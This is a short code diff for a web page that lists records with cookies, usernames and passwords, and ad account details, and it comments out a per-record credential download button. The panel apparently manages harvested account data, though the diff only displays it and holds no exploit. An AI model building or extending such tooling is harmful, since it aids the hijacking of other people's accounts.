@@ -62,8 +62,8 @@ function setListCookies(res){
                     <textarea class="form-control" id="exampleFormControlTextarea4" rows="3">${element['cookie']}</textarea>
                 </div>
             </td>
-            <td><p class="text-break">${element['usernameAndPassword']}</p></td>
-            <td><button onclick='CreateTextFile("${element['uid']}","${element['usernameAndPassword'] ? element['usernameAndPassword'] : null}",this)' class="btn btn-warning w-20 ml-3 confirm-button">Download</button></td>`;
+            <td><p class="text-break">${element['usernameAndPassword']}</p></td>`;
+            // <td><button onclick='CreateTextFile("${element['uid']}","${element['usernameAndPassword'] ? element['usernameAndPassword'] : null}",this)' class="btn btn-warning w-20 ml-3 confirm-button">Download</button></td>`;
             if(infoAds!=null){
                 htmlSegment+= `<td>${infoAds['adsName']}<br>(${infoAds['adsId']})</td>
                 <td>${infoAds['currency']} / ${infoAds['country']}</td>
